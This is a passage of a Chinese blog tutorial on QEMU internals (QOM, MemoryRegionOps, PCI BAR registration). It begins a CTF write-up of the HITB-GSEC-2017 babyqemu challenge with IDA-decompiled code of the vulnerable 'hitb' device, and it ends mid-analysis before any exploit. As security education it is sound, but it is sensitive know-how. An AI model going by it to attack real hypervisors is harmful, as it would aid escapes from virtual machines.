class="line"><span class="class">&#123;</span></span><br><span class="line">    ObjectClass *<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line">    ObjectFree *<span class="built_in">free</span>;</span><br><span class="line">    GHashTable *properties;</span><br><span class="line">    <span class="keyword">uint32_t</span> ref;</span><br><span class="line">    Object *parent;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>同样，我们在类定义那里需要修改一下与<code>Object</code>相关的东西</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TestObject</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Object parent;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test_object_init</span><span class="params">(Object *obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> TypeInfo test_type_info = </span><br><span class="line">&#123;</span><br><span class="line">    .name = <span class="string">&quot;TEST_TYPE&quot;</span>,</span><br><span class="line">    .parent = TYPE_OBJECT,</span><br><span class="line">    .class_size = <span class="keyword">sizeof</span>(TestClass),</span><br><span class="line">    .class_init = test_class_init,</span><br><span class="line">    .instance_size = <span class="keyword">sizeof</span>(TestObject),</span><br><span class="line">    .instance_init = test_object_init,</span><br><span class="line">    .interfaces = (InterfaceInfo[])</span><br><span class="line">    &#123;</span><br><span class="line">        &#123;&#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="PCI的内存空间"><a href="#PCI的内存空间" class="headerlink" title="PCI的内存空间"></a>PCI的内存空间</h2><p>qemu中使用<code>MemoryRegion</code>来标识内存空间(定义于<code>include/exec/memory/h</code>)。使用<code>MemoryRegionOps</code>结构体来定义对内存操作的一些内容。对于<code>MMIO</code>以及<code>PMIO</code>操作都需要相应的<code>MemoryRegionOps</code>结构体，在此结构体中我们可以定义对应的<code>read/write</code>回调函数</p><p><code>MemoryRegionOps</code>定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Memory region callbacks</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegionOps</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 从内存区域上读. @addr 与 @mr 有关; @size 单位为字节. */</span></span><br><span class="line">    <span class="keyword">uint64_t</span> (*read)(<span class="keyword">void</span> *opaque,</span><br><span class="line">                     hwaddr addr,</span><br><span class="line">                     <span class="keyword">unsigned</span> size);</span><br><span class="line">    <span class="comment">/* 往内存区域上写. @addr 与 @mr 有关; @size 单位为字节. */</span></span><br><span class="line">    <span class="keyword">void</span> (*write)(<span class="keyword">void</span> *opaque,</span><br><span class="line">                  hwaddr addr,</span><br><span class="line">                  <span class="keyword">uint64_t</span> data,</span><br><span class="line">                  <span class="keyword">unsigned</span> size);</span><br><span class="line">    MemTxResult (*read_with_attrs)(<span class="keyword">void</span> *opaque,</span><br><span class="line">                                   hwaddr addr,</span><br><span class="line">                                   <span class="keyword">uint64_t</span> *data,</span><br><span class="line">                                   <span class="keyword">unsigned</span> size,</span><br><span class="line">                                   MemTxAttrs attrs);</span><br><span class="line">    MemTxResult (*write_with_attrs)(<span class="keyword">void</span> *opaque,</span><br><span class="line">                                    hwaddr addr,</span><br><span class="line">                                    <span class="keyword">uint64_t</span> data,</span><br><span class="line">                                    <span class="keyword">unsigned</span> size,</span><br><span class="line">                                    MemTxAttrs attrs);</span><br><span class="line">    <span class="keyword">enum</span> device_endian endianness;</span><br><span class="line">    <span class="comment">/* Guest可见约束: */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="comment">/* 若非 0，则指定了超出机器检查范围的访问大小界限</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">unsigned</span> min_access_size;</span><br><span class="line">        <span class="keyword">unsigned</span> max_access_size;</span><br><span class="line">        <span class="comment">/* If true, unaligned accesses are supported.  Otherwise unaligned</span></span><br><span class="line"><span class="comment">         * accesses throw machine checks.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">         <span class="keyword">bool</span> unaligned;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 若存在且 #false, 则该事务不会被设备所接受</span></span><br><span class="line"><span class="comment">         * (并导致机器的相关行为，例如机器检查异常).</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">bool</span> (*accepts)(<span class="keyword">void</span> *opaque, hwaddr addr,</span><br><span class="line">                        <span class="keyword">unsigned</span> size, <span class="keyword">bool</span> is_write,</span><br><span class="line">                        MemTxAttrs attrs);</span><br><span class="line">    &#125; valid;</span><br><span class="line">    <span class="comment">/* 内部应用约束: */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="comment">/* 若非 0，则决定了最小的实现的 size .</span></span><br><span class="line"><span class="comment">         * 更小的 size 将被向上回绕，且将返回部分结果.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">unsigned</span> min_access_size;</span><br><span class="line">        <span class="comment">/* 若非 0，则决定了最大的实现的 size . </span></span><br><span class="line"><span class="comment">         * 更大的 size 将被作为一系列的更小的 size 的访问而完成.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">unsigned</span> max_access_size;</span><br><span class="line">        <span class="comment">/* 若为 true, 支持非对齐的访问.  </span></span><br><span class="line"><span class="comment">         * 否则所有的访问都将被转换为（可能多种）对齐的访问.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">bool</span> unaligned;</span><br><span class="line">    &#125; impl;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们可以定义对应的回调函数，以及一些其他属性等</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> MemoryRegionOps pci_testdev_mmio_ops = &#123;</span><br><span class="line">        .read = pci_testdev_read,</span><br><span class="line">        .write = pci_testdev_mmio_write,</span><br><span class="line">        .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">        .impl = &#123;</span><br><span class="line">                .min_access_size = <span class="number">1</span>,</span><br><span class="line">                .max_access_size = <span class="number">1</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们可以用<code>memory_region_init_io</code>函数初始化<code>MemoryRegion</code>结构体对应的内存空间，记录空间大小，注册<code>MMIO/PMIO</code>读写函数，然后可以通过<code>pci_register_bar</code>来注册BAR信息等</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* hw/misc/pci-testdev.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOTEST_IOSIZE 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOTEST_MEMSIZE 2048</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PCITestDevState</span> &#123;</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        PCIDevice parent_obj;</span><br><span class="line">        <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line"></span><br><span class="line">        MemoryRegion mmio;</span><br><span class="line">        MemoryRegion portio;</span><br><span class="line">        IOTest *tests;</span><br><span class="line">        <span class="keyword">int</span> current;</span><br><span class="line">&#125; PCITestDevState;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pci_testdev_init</span><span class="params">(PCIDevice *pci_dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        PCITestDevState *d = PCI_TEST_DEV(pci_dev);</span><br><span class="line">        ...</span><br><span class="line">        memory_region_init_io(&amp;d-&gt;mmio, OBJECT(d), &amp;pci_testdev_mmio_ops, d,</span><br><span class="line">                                                    <span class="string">&quot;pci-testdev-mmio&quot;</span>, IOTEST_MEMSIZE * <span class="number">2</span>); </span><br><span class="line">        memory_region_init_io(&amp;d-&gt;portio, OBJECT(d), &amp;pci_testdev_pio_ops, d,</span><br><span class="line">                                                    <span class="string">&quot;pci-testdev-portio&quot;</span>, IOTEST_IOSIZE * <span class="number">2</span>); </span><br><span class="line">        pci_register_bar(pci_dev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;d-&gt;mmio);</span><br><span class="line">        pci_register_bar(pci_dev, <span class="number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;d-&gt;portio);</span><br></pre></td></tr></table></figure><h2 id="QEMU中PCI设备的编写"><a href="#QEMU中PCI设备的编写" class="headerlink" title="QEMU中PCI设备的编写"></a>QEMU中PCI设备的编写</h2><p>编写好之后在<code>/hw/misc/messon.build</code>下加入相应条目</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">softmmu.ss(when: &#x27;&#x27;,if_ture:files(&#x27;&#x27;))</span><br></pre></td></tr></table></figure><p>然后在<code>/hw/misc/Kconfig</code>中添加相应条目</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config XXX</span><br><span class="line">    <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">default</span> y <span class="keyword">if</span> PCI_DEVICES</span><br><span class="line">    depends on PCI</span><br></pre></td></tr></table></figure><p>编译QEMU后启动的时候加上<code>-device XXX</code>就能找到相应的PCI设备</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="HITB-GSEC-2017-babyqemu"><a href="#HITB-GSEC-2017-babyqemu" class="headerlink" title="HITB-GSEC-2017-babyqemu"></a>HITB-GSEC-2017-babyqemu</h2><p>查看启动脚本，有个<code>-device hitb</code>，这个就是有漏洞的设备了。我们把qemu文件拖进IDA分析一会，然后字符串搜索<code>hitb</code>相关函数便能看到一些相关的函数</p><p><img src="https://s2.loli.net/2023/05/10/yhsSwgTzfMLHrW6.png" alt="image-20230510201011352"></p><p>我们可以分析一下一些函数的功能(这些函数的编写就是对应于前面的QOM模型)。需要注意的是，有时候IDA识别的结构体有问题，所以我们可以在本地类型里面搜到原本定义的结构体(这里是<code>HitbState</code>，其定义如下)，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> HitbState struc ; (<span class="keyword">sizeof</span>=<span class="number">0x1BD0</span>, align=<span class="number">0x10</span>, copyof_1494)</span><br><span class="line"><span class="number">00000000</span> pdev PCIDevice_0 ?</span><br><span class="line"><span class="number">000009F</span>0 mmio MemoryRegion_0 ?</span><br><span class="line"><span class="number">00000</span>AF0 thread QemuThread_0 ?</span><br><span class="line"><span class="number">00000</span>AF8 thr_mutex QemuMutex_0 ?</span><br><span class="line"><span class="number">00000B</span>20 thr_cond QemuCond_0 ?</span><br><span class="line"><span class="number">00000B</span>50 stopping db ?</span><br><span class="line"><span class="number">00000B</span>51 db ? ; undefined</span><br><span class="line"><span class="number">00000B</span>52 db ? ; undefined</span><br><span class="line"><span class="number">00000B</span>53 db ? ; undefined</span><br><span class="line"><span class="number">00000B</span>54 addr4 dd ?</span><br><span class="line"><span class="number">00000B</span>58 fact dd ?</span><br><span class="line"><span class="number">00000B</span>5C status dd ?</span><br><span class="line"><span class="number">00000B</span>60 irq_status dd ?</span><br><span class="line"><span class="number">00000B</span>64 db ? ; undefined</span><br><span class="line"><span class="number">00000B</span>65 db ? ; undefined</span><br><span class="line"><span class="number">00000B</span>66 db ? ; undefined</span><br><span class="line"><span class="number">00000B</span>67 db ? ; undefined</span><br><span class="line"><span class="number">00000B</span>68 dma dma_state ?</span><br><span class="line"><span class="number">00000B</span>88 dma_timer QEMUTimer_0 ?</span><br><span class="line"><span class="number">00000B</span>B8 dma_buf db <span class="number">4096</span> dup(?)</span><br><span class="line"><span class="number">00001B</span>B8 enc dq ?                                ; offset</span><br><span class="line"><span class="number">00001B</span>C0 dma_mask dq ?</span><br><span class="line"><span class="number">00001B</span>C8 db ? ; undefined</span><br><span class="line"><span class="number">00001B</span>C9 db ? ; undefined</span><br><span class="line"><span class="number">00001B</span>CA db ? ; undefined</span><br><span class="line"><span class="number">00001B</span>CB db ? ; undefined</span><br><span class="line"><span class="number">00001B</span>CC db ? ; undefined</span><br><span class="line"><span class="number">00001B</span>CD db ? ; undefined</span><br><span class="line"><span class="number">00001B</span>CE db ? ; undefined</span><br><span class="line"><span class="number">00001B</span>CF db ? ; undefined</span><br><span class="line"><span class="number">00001B</span>D0 HitbState ends</span><br></pre></td></tr></table></figure><p>然后使用<code>y</code>更改类型即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_class_init</span><span class="params">(ObjectClass_0 *a1, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PCIDeviceClass *v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = (PCIDeviceClass *)object_class_dynamic_cast_assert(</span><br><span class="line">                           a1,</span><br><span class="line">                           (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_64A230.bulk_in_pending[<span class="number">2</span>].data[<span class="number">72</span>],</span><br><span class="line">                           (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_5AB2C8.msi_vectors,</span><br><span class="line">                           <span class="number">469</span>,</span><br><span class="line">                           <span class="string">&quot;hitb_class_init&quot;</span>);</span><br><span class="line">  v2-&gt;revision = <span class="number">16</span>;</span><br><span class="line">  v2-&gt;class_id = <span class="number">255</span>;</span><br><span class="line">  v2-&gt;realize = (<span class="keyword">void</span> (*)(PCIDevice_0 *, Error_0 **))pci_hitb_realize;</span><br><span class="line">  v2-&gt;<span class="built_in">exit</span> = pci_hitb_uninit;</span><br><span class="line">  v2-&gt;vendor_id = <span class="number">4660</span>;</span><br><span class="line">  v2-&gt;device_id = <span class="number">9011</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里定义了设备号，厂商号以及初始化函数以及exit对应的函数等等，我们看看这个初始化函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">pci_hitb_realize</span><span class="params">(HitbState *pdev, Error_0 **errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  pdev-&gt;pdev.config[<span class="number">61</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !msi_init(&amp;pdev-&gt;pdev, <span class="number">0</span>, <span class="number">1u</span>, <span class="number">1</span>, <span class="number">0</span>, errp) )</span><br><span class="line">  &#123;</span><br><span class="line">    timer_init_tl(&amp;pdev-&gt;dma_timer, main_loop_tlg.tl[<span class="number">1</span>], <span class="number">1000000</span>, (QEMUTimerCB *)hitb_dma_timer, pdev);</span><br><span class="line">    qemu_mutex_init(&amp;pdev-&gt;thr_mutex);</span><br><span class="line">    qemu_cond_init(&amp;pdev-&gt;thr_cond);</span><br><span class="line">    qemu_thread_create(&amp;pdev-&gt;thread, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_5AB2C8.not_legacy_32bit + <span class="number">12</span>, hitb_fact_thread, pdev, <span class="number">0</span>);</span><br><span class="line">    memory_region_init_io(&amp;pdev-&gt;mmio, &amp;pdev-&gt;pdev.qdev.parent_obj, &amp;hitb_mmio_ops, pdev, <span class="string">&quot;hitb-mmio&quot;</span>, <span class="number">0x100000</span>uLL);</span><br><span class="line">    pci_register_bar(&amp;pdev-&gt;pdev, <span class="number">0</span>, <span class="number">0</span>, &amp;pdev-&gt;mmio);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要比较重要的是注册了一些回调函数，设置了<code>&amp;pdev-&gt;dma_timer</code>的回调函数为<code>hitb_dma_timer</code> </p><p>还有<code>memory_region_init_io</code>这行初始化了MMIO，指定了读写的回调函数(<code>&amp;hitb_mmio_ops</code>)(这是一个类似于虚表的东西，里面放着MMIO_READ和MMIO_WRITE对应的函数指针)</p><p>  <img src="https://s2.loli.net/2023/05/10/yHx5Jh6M3OuURqY.png" alt="image-20230510201849692"></p><p>最后pci_register_bar语句就是将这个<code>&amp;pdev-&gt;mmio</code>注册到qemu PCI设备的BAR(就是之前说到的配置空间的那个BAR)。第二个参数0代表注册MMIO，1代表注册PMIO</p><p>还有初始化实例的这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_instance_init</span><span class="params">(Object_0 *obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v1 = (__int64)object_dynamic_cast_assert(</span><br><span class="line">                  obj,</span><br><span class="line">                  (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_5AB2C8.not_legacy_32bit + <span class="number">12</span>,</span><br><span class="line">                  (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_5AB2C8.msi_vectors,</span><br><span class="line">                  <span class="number">459</span>,</span><br><span class="line">                  <span class="string">&quot;hitb_instance_init&quot;</span>);</span><br><span class="line">  *(_QWORD *)(v1 + <span class="number">7104</span>) = <span class="number">0xFFFFFFF</span>LL;</span><br><span class="line">  v1 += <span class="number">7104L</span>L;</span><br><span class="line">  *(_QWORD *)(v1 - <span class="number">8</span>) = hitb_enc;</span><br><span class="line">  object_property_add(</span><br><span class="line">    obj,</span><br><span class="line">    (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_5AB2C8.server_bar2.coalesced.tqh_first + <span class="number">3</span>,</span><br><span class="line">    <span class="string">&quot;uint64&quot;</span>,</span><br><span class="line">    hitb_obj_uint64,</span><br><span class="line">    hitb_obj_uint64,</span><br><span class="line">    <span class="number">0L</span>L,</span><br><span class="line">    (<span class="keyword">void</span> *)v1,</span><br><span class="line">    <span class="number">0L</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把<code>HitbState-&gt;enc</code>函数指针初始化为<code>hitb_enc</code>(你问我为什么，注意到结构体HitbState的0x1BB8偏移处是enc指针，换算成十进制就是7096，如果把v1看作是指向HitbState结构体的指针的话正好是<code>*(v1+7104-8) = *(v1+7096)=hib_enc</code> 这里大概涉及到指针加减的操作，直接把v1改变类型识别得很难看</p><p>然后便是这个相应的READ和WRITE函数，可以看到并没有什么洞，因为主要是对HitbState这个结构体的成员进行一系列赋值而已</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">hitb_mmio_read</span><span class="params">(HitbState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">uint64_t</span> val; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">128</span> )</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;dma.src;</span><br><span class="line">    <span class="keyword">if</span> ( addr &gt; <span class="number">0x80</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">140</span> )</span><br><span class="line">        <span class="keyword">return</span> *(<span class="keyword">dma_addr_t</span> *)((<span class="keyword">char</span> *)&amp;opaque-&gt;dma.dst + <span class="number">4</span>);</span><br><span class="line">      <span class="keyword">if</span> ( addr &lt;= <span class="number">0x8C</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">132</span> )</span><br><span class="line">          <span class="keyword">return</span> *(<span class="keyword">dma_addr_t</span> *)((<span class="keyword">char</span> *)&amp;opaque-&gt;dma.src + <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">136</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;dma.dst;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">144</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;dma.cnt;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">152</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;dma.cmd;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        qemu_mutex_lock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">        val = opaque-&gt;fact;</span><br><span class="line">        qemu_mutex_unlock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( addr &lt;= <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">16777453L</span>L;</span><br><span class="line">        <span class="keyword">if</span> ( !addr )</span><br><span class="line">          <span class="keyword">return</span> result;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;addr4;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">32</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;status;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">36</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;irq_status;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有就是write，代码过长就不贴了，自己IDA上面可以看</p><p>我们可以注意到当MMIO_WRITE的时候会有如下分支，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">152</span> &amp;&amp; (val &amp; <span class="number">1</span>) != <span class="number">0</span> &amp;&amp; (opaque-&gt;dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">            opaque-&gt;dma.cmd = val;</span><br><span class="line">            ns = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL_0);</span><br><span class="line">            timer_mod(&amp;opaque-&gt;dma_timer, ns / <span class="number">1000000</span> + <span class="number">100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里应该会调用<code>opaque-&gt;dma_timer</code>的回调函数<code>hitb_dma_timer</code> ，我们关注一下这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 